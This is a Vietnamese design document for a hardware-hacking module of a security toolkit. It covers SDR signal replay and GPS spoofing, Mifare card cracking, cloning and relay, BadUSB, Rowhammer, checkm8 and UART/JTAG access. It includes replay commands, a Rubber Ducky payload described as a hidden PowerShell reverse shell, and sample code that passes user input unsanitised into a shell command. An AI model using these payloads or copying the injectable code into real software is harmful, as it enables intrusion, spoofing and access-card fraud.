# ⚡ Phantoma HARDWARE — Tài Liệu Module Phần Cứng

> **Phiên bản:** 1.0.0  
> **Module:** Hardware Hacking & Physical Layer Attacks  
> **Nền tảng:** Phantoma — Hệ Sinh Thái An Ninh Mạng Tự Động Hóa  

---

## 📑 Mục Lục

- [1. Tổng Quan Kiến Trúc](#1-tổng-quan-kiến-trúc)
- [2. Software-Defined Radio (SDR)](#2-software-defined-radio-sdr)
- [3. NFC & RFID](#3-nfc--rfid)
- [4. BadUSB & Rubber Ducky](#4-badusb--rubber-ducky)
- [5. Rowhammer & Physical Memory Attack](#5-rowhammer--physical-memory-attack)
- [6. Bootrom Exploit (Checkm8, etc.)](#6-bootrom-exploit-checkm8-etc)
- [7. Low‑Level Interfaces (JTAG, UART, SPI, I2C)](#7-low-level-interfaces-jtag-uart-spi-i2c)
- [8. Side‑Channel Attacks (Timing, Power, EM)](#8-side-channel-attacks-timing-power-em)
- [9. Cơ Chế An Toàn & Giới Hạn](#9-cơ-chế-an-toàn--giới-hạn)
- [10. Luồng Dữ Liệu & API](#10-luồng-dữ-liệu--api)
- [11. Hướng Dẫn Phát Triển](#11-hướng-dẫn-phát-triển)

---

## 1. Tổng Quan Kiến Trúc

Module **HARDWARE** yêu cầu các thiết bị ngoại vi chuyên dụng (SDR dongle, NFC reader, Teensy, logic analyzer). Các thao tác chủ yếu được thực hiện qua dòng lệnh, module cung cấp giao diện để hướng dẫn, ghi log và parse kết quả.

```
HARDWARE/
├── HARDWARE.md                  ← Tài liệu này
├── index.tsx                    ← Component chính
├── SDR/                         ← Software-Defined Radio
│   ├── SDRSetup.tsx
│   ├── FrequencyScanner.tsx
│   ├── ReplayAttack.tsx
│   ├── GPSSpoofing.tsx
│   └── ...
├── NFC_RFID/                    ← NFC & RFID
│   ├── ReaderSetup.tsx
│   ├── MifareClassicCrack.tsx
│   ├── CardClone.tsx
│   ├── RelayAttack.tsx
│   └── ...
├── BadUSB/                      ← BadUSB / Rubber Ducky
│   ├── PayloadBuilder.tsx
│   ├── Flasher.tsx
│   └── ...
├── Rowhammer/                   ← Rowhammer
│   ├── RowhammerTester.tsx
│   └── ...
├── Bootrom/                     ← Bootrom exploit
│   ├── Checkm8.tsx
│   ├── PayloadInjector.tsx
│   └── ...
├── LowLevel/                    ← JTAG, UART, SPI, I2C
│   ├── UARTReader.tsx
│   ├── JTAGExplorer.tsx
│   └── ...
├── SideChannel/                 ← Side‑channel
│   ├── TimingAnalyzer.tsx
│   └── ...
├── services/                    (gnuradio, rtl_433, mfoc, proxmark3, hid-flasher)
├── types/
└── utils/
```

### 🎯 Các kỹ thuật chính

| # | Lĩnh vực | Kỹ thuật |
|---|----------|----------|
| 1 | SDR | Quét tần số, ghi và phát lại tín hiệu, GPS spoofing |
| 2 | NFC/RFID | Đọc/ghi thẻ Mifare Classic, clone, relay attack |
| 3 | BadUSB | Tạo payload Rubber Ducky, nạp firmware |
| 4 | Rowhammer | Tấn công lật bit DRAM, leo thang đặc quyền |
| 5 | Bootrom | Jailbreak iOS (checkm8), khai thác bootloader |
| 6 | Low‑Level | UART logging, JTAG debug, SPI/I2C sniffing |
| 7 | Side‑Channel | Timing attack, power analysis (đơn giản) |

---

## 2. Software-Defined Radio (SDR)

### 2.1 Thiết Bị Hỗ Trợ

| Thiết bị | Dải tần | Ứng dụng |
|----------|---------|----------|
| RTL-SDR (RTL2832U) | 24MHz – 1.7GHz | Quét tần số, dò tín hiệu IoT, ADS‑B |
| HackRF One | 1MHz – 6GHz | TX/RX, phát lại, GPS spoofing |
| LimeSDR | 100kHz – 3.8GHz | MIMO, full duplex |
| BladeRF | 300MHz – 3.8GHz | TX/RX, công suất cao hơn |

### 2.2 Quét Tần Số (Frequency Scanning)

| Tham số | Kiểu | Mô tả |
|---------|------|-------|
| `startFreq` | `number` | Tần số bắt đầu (MHz) |
| `endFreq` | `number` | Tần số kết thúc |
| `step` | `number` | Bước nhảy (kHz) |
| `gain` | `number` | Độ lợi (dB) |
| `output` | `string` | File ghi kết quả (CSV) |

**Công cụ:** `rtl_power`, `rtl_433`, `gqrx`.

**Output:** Biểu đồ phổ tần, phát hiện các đỉnh tín hiệu lạ.

**Component:** `SDR/FrequencyScanner.tsx` – hiển thị biểu đồ tần số, cho phép zoom vào một dải để ghi chi tiết.

### 2.3 Ghi & Phát Lại Tín Hiệu (Replay Attack)

| Bước | Mô tả | Lệnh |
|------|-------|------|
| 1 | Ghi tín hiệu từ remote | `rtl_sdr -f 433.92M -s 2.4M -g 20 -n 1000000 capture.bin` |
| 2 | Phân tích dạng sóng | `inspectrum capture.bin` |
| 3 | Phát lại (với HackRF) | `hackrf_transfer -t capture.bin -f 433.92M -s 2.4M` |

**Cảnh báo:** Tín hiệu có rolling code (cửa cuốn, ô tô hiện đại) không thể replay đơn giản. Chỉ áp dụng cho thiết bị cũ hoặc code cố định.

### 2.4 GPS Spoofing (với HackRF + bladeRF)

- Phát tín hiệu GPS giả để đánh lừa thiết bị.
- Dùng `gps-sdr-sim` tạo file baseband, sau đó phát bằng HackRF.

**Output:** Thay đổi tọa độ của receiver trong phạm vi.

---

## 3. NFC & RFID

### 3.1 Thiết Bị Hỗ Trợ

| Thiết bị | Tần số | Khả năng |
|----------|--------|----------|
| Proxmark3 | 125kHz, 13.56MHz | Đọc/ghi, brute-force, sniff |
| ACR122U | 13.56MHz | Đọc/ghi thẻ Mifare, hỗ trợ libnfc |
| PN532 | 13.56MHz | Module rẻ, kết nối UART/USB |

### 3.2 Đọc Thẻ (Mifare Classic 1K/4K)

| Thông tin thu được | Mô tả |
|--------------------|-------|
| `UID` | Mã định danh duy nhất |
| `sectors` | 16 sector (1K), mỗi sector có 2 key |
| `blocks` | Mỗi sector 4 block (16 byte) |
| `data` | Dữ liệu trong các block có thể đọc được (nếu biết key) |

**Công cụ:** `mfoc` (brute-force key), `mfcuk` (cryptanalysis).

**Quy trình tấn công Mifare Classic:**
1. Sniff giao tiếp giữa reader và thẻ.
2. Dùng `mfoc` để khôi phục key từ các thẻ biết trước dữ liệu.
3. Dùng key để đọc toàn bộ thẻ.

### 3.3 Clone Thẻ (UID Writable)

- Đối với thẻ UID có thể ghi (UID changeable), có thể clone toàn bộ.
- Thẻ mới sẽ có cùng UID và dữ liệu.

**Component:** `NFC_RFID/CardClone.tsx` – hướng dẫn từng bước, hiển thị output.

### 3.4 Relay Attack

- Giả lập thẻ từ xa qua hai thiết bị: một ở gần reader, một ở gần thẻ.
- Dùng Proxmark3 hoặc hai thiết bị PN532.

---

## 4. BadUSB & Rubber Ducky

### 4.1 Rubber Ducky Scripting

Rubber Ducky giả lập bàn phím, gõ cực nhanh để thực thi payload.

| Lệnh | Mô tả |
|------|-------|
| `STRING` | Gõ chuỗi |
| `ENTER` | Phím Enter |
| `DELAY` | Chờ (ms) |
| `GUI r` | Windows + R (mở Run) |
| `CTRL-ALT-DEL` | Tổ hợp phím |

**Ví dụ payload mở reverse shell:**
```duckyscript
DELAY 1000
GUI r
DELAY 500
STRING powershell -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAKAA...
ENTER
```

### 4.2 Các Nền Tảng BadUSB

| Thiết bị | Đặc điểm |
|----------|----------|
| Rubber Ducky | Chuyên dụng, dễ lập trình |
| Teensy (2.0, 4.0) | Có thể lập trình C, mạnh hơn |
| Arduino Leonardo | Pro Micro (ATmega32U4) |
| USB Rubber Ducky (tự làm) | Dùng Digispark hoặc ATTiny85 |

**Component:** `BadUSB/PayloadBuilder.tsx` – cho phép kéo thả các khối lệnh, sinh script.

---

## 5. Rowhammer & Physical Memory Attack

### 5.1 Giới Thiệu

Rowhammer là lỗ hổng DRAM: đọc/ghi liên tục vào một dòng (row) có thể lật bit ở dòng kế cận (adjacent row). Trên Linux, có thể dùng để leo thang đặc quyền hoặc thoát container.

### 5.2 Công Cụ Kiểm Tra

| Công cụ | Mô tả |
|---------|-------|
| `rowhammer-test` | Kiểm tra DRAM có bị ảnh hưởng không |
| `drammer` (Android) | PoC trên ARM |
| `half-double` | Kỹ thuật lật bit xa hơn 1 row |

**Component:** `Rowhammer/RowhammerTester.tsx` – chạy test, báo cáo kết quả (vulnerable/not vulnerable).

### 5.3 Tấn Công Leo Thang

- Trên Linux, có thể dẫn đến kernel memory corruption, leo lên root.
- Cần code assembly tùy chỉnh.

> **Lưu ý:** Rowhammer không thể chạy qua VM, yêu cầu phần cứng thật.

---

## 6. Bootrom Exploit (Checkm8, etc.)

### 6.1 Checkm8 (iOS)

- Lỗ hổng bootrom trên các thiết bị Apple A5 – A11 (iPhone 4s – X).
- Không thể vá vì là bootrom (read‑only memory).
- Cho phép jailbreak vĩnh viễn, đọc/write bất kỳ vùng nhớ.

**Quy trình:**
1. Đưa thiết bị vào chế độ DFU.
2. Chạy `checkm8` script.
3. Tải payload (ví dụ `pongoOS`).
4. Jailbreak.

**Component:** `Bootrom/Checkm8.tsx` – hướng dẫn từng bước, hiển thị log.

### 6.2 Các Bootrom Khác

- **Shamiko** (MediaTek)
- **Amlogic USB Burning Mode** (thiết bị Android TV)

---

## 7. Low‑Level Interfaces (JTAG, UART, SPI, I2C)

### 7.1 UART (Serial Console)

| Thiết bị thường có UART | Cách nhận biết |
|------------------------|----------------|
| Router, switch, IoT | 4 pin (TX, RX, GND, VCC) |
| Embedded Linux | Boot log in ra UART |

**Khai thác:**
- Kết nối USB‑to‑TTL (CP2102, FTDI).
- Monitor baud rate (thường 115200, 57600).
- Đọc log, có thể truy cập console (root shell nếu không có password).

**Component:** `LowLevel/UARTReader.tsx` – hướng dẫn đấu nối, tự động dò baud rate.

### 7.2 JTAG (Debug Interface)

- Cho phép dừng CPU, đọc/ghi memory, breakpoint.
- Yêu cầu phần cứng: FT2232H, J-Link, Bus Pirate.

**Ứng dụng:** Dump firmware, bypass secure boot.

### 7.3 SPI / I2C Sniffing

- Dùng logic analyzer (Saleae, Logic 8) để bắt giao tiếp giữa chip.
- Phân tích protocol, lấy dữ liệu.

---

## 8. Side‑Channel Attacks (Timing, Power, EM)

### 8.1 Timing Attack (Cơ bản)

| Mục tiêu | Cách tấn công |
|----------|---------------|
| So sánh mật khẩu | Đo thời gian trả về của từng ký tự |
| Kiểm tra MAC (HMAC) | Thời gian verify khác biệt |

**Công cụ:** Script Python đo thời gian, gửi hàng nghìn request.

### 8.2 Power Analysis (Đơn giản)

- Đo điện áp tiêu thụ của chip khi thực thi mã hóa.
- Cần oscilloscope + preamp, thường không thực hiện qua module này (chỉ hướng dẫn).

---

## 9. Cơ Chế An Toàn & Giới Hạn

### 9.1 Yêu cầu vật lý

- Hầu hết các kỹ thuật đều **cần tiếp cận vật lý** thiết bị.
- Module chỉ cung cấp hướng dẫn, ghi log, không tự động hóa hoàn toàn (vì khác biệt phần cứng).

### 9.2 Xác nhận người dùng

- Cảnh báo rõ ràng: "Kỹ thuật này có thể làm hỏng thiết bị hoặc vi phạm bảo hành".
- Yêu cầu xác nhận từng bước trước khi chạy lệnh nguy hiểm (như nạp firmware).

### 9.3 Trách nhiệm pháp lý

- Hiển thị banner đỏ "CHỈ DÙNG TRONG MÔI TRƯỜNG LAB HOẶC THIẾT BỊ CỦA BẠN".

---

## 10. Luồng Dữ Liệu & API

Do yêu cầu phần cứng, module HARDWARE chủ yếu là **hướng dẫn tương tác** và ghi log, không có API tự động hoàn toàn. Backend chỉ gọi các CLI tool để đọc/log.

### Endpoints dự kiến (chỉ đọc/log)

| Method | Endpoint | Body | Mô tả |
|--------|----------|------|-------|
| POST | `/api/hardware/sdr/scan` | `{ startFreq, endFreq, device }` | Quét tần số, trả về CSV |
| POST | `/api/hardware/sdr/replay` | `{ file, frequency, device }` | Phát lại tín hiệu |
| POST | `/api/hardware/nfc/read` | `{ device }` | Đọc thẻ gần |
| POST | `/api/hardware/nfc/clone` | `{ sourceUID, targetUID }` | Clone thẻ |
| POST | `/api/hardware/badusb/flash` | `{ script, device }` | Nạp payload |
| POST | `/api/hardware/rowhammer/test` | `{ iterations }` | Kiểm tra Rowhammer |
| POST | `/api/hardware/bootrom/checkm8` | `{ deviceId }` | Chạy checkm8 |

---

## 11. Hướng Dẫn Phát Triển

### 11.1 Các Thư Viện / Công Cụ Gọi

| Mục đích | Công cụ |
|----------|---------|
| SDR | `rtl-sdr`, `hackrf`, `gnuradio` (Python) |
| NFC | `libnfc`, `mfoc`, `proxmark3` client |
| BadUSB | `duckencoder`, `hid-flasher` |
| Rowhammer | `rowhammer-test` (C) |
| Bootrom | `checkm8` (Python) |

### 11.2 Service Wrapper

Mỗi service gọi CLI tool, parse stdout/stderr, trả về JSON.

```typescript
// services/sdr.ts
export async function frequencyScan(params: ScanParams): Promise<ScanResult> {
  const cmd = `rtl_power -f ${params.startFreq}M:${params.endFreq}M:${params.step}k -g ${params.gain} -c 0.5`;
  const output = await exec(cmd);
  return parseRTLPower(output);
}
```

### 11.3 UI Components

- **DeviceSelector**: Danh sách thiết bị đã kết nối (qua USB).
- **LogTerminal**: Hiển thị log real‑time từ SDR/NFC.
- **WaveformViewer**: Hiển thị tín hiệu đã ghi (dùng `inspectrum` web?).

---

## 📊 Tổng Kết

| Chỉ số | Giá trị |
|--------|---------|
| **Số kỹ thuật** | 7 nhóm lớn, 15+ kỹ thuật con |
| **Thiết bị hỗ trợ** | RTL-SDR, HackRF, Proxmark3, ACR122U, Teensy, Rubber Ducky |
| **Mức độ tự động** | Thấp (chủ yếu hướng dẫn, wrapper CLI) |
| **Rủi ro pháp lý** | Cực kỳ cao nếu dùng sai mục đích |
| **Yêu cầu đặc biệt** | Tiếp cận vật lý, có thể gây hỏng hóc |

> **Phantoma HARDWARE v1.0.0** — *"Khi phần mềm không đủ, lấn xuống tầng silicon"* 🔩